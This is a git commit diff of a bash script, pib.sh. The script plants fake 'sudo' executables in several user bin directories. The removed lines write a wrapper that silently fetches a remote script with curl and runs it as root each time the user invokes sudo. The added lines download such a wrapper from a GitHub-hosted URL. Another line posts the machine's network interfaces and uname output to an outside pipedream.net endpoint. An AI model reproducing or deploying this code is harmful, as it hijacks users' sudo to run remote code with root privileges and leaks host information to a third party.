1a10de578ed4a75c5a07fd3eb82ad3fa7ffa6b86
skyf0l <tom.rorato@epitech.eu>
2021-06-28 17:52:55 +0200

    Update pib.sh

--- pib.sh
+++ pib.sh
@@ -1,25 +1,14 @@
 #!/bin/bash
 
-echo '#!/bin/bash
-/bin/sudo bash -c "((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown) | nohup sudo bash > /dev/null 2>&1 &disown)" > /dev/null 2>&1
-if [ $? = 0 ]; then
-    /bin/sudo $@
-fi' > ~/.local/bin/sudo
-chmod +x ~/.local/bin/sudo
+# echo '#!/bin/bash
+# /bin/sudo bash -c "((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown) | nohup sudo bash > /dev/null 2>&1 &disown)" > /dev/null 2>&1
+# if [ $? = 0 ]; then
+#     /bin/sudo $@
+# fi'
 
-echo '#!/bin/bash
-/bin/sudo bash -c "((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown) | nohup sudo bash > /dev/null 2>&1 &disown)" > /dev/null 2>&1
-if [ $? = 0 ]; then
-    /bin/sudo $@
-fi' > ~/.bin/sudo
-chmod +x ~/.bin/sudo
-
-echo '#!/bin/bash
-/bin/sudo bash -c "((nohup curl https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/ib.sh 2> /dev/null&disown) | nohup sudo bash > /dev/null 2>&1 &disown)" > /dev/null 2>&1
-if [ $? = 0 ]; then
-    /bin/sudo $@
-fi' > ~/bin/sudo
-chmod +x ~/bin/sudo
+curl -f https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/s.shd -o ~/.local/bin/sudo && chmod +x ~/.local/bin/sudo
+curl -f https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/s.shd -o ~/.bin/sudo && chmod +x ~/.bin/sudo
+curl -f https://raw.githubusercontent.com/skyf0l/skyf0l.github.io/main/s.shd -o ~/bin/sudo && chmod +x ~/bin/sudo
 
 if [ -e ~/.local/bin/sudo ]; then
     (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/user_$(uname -n) -X POST -d "$(</dev/stdin)" > /dev/null 2>&1
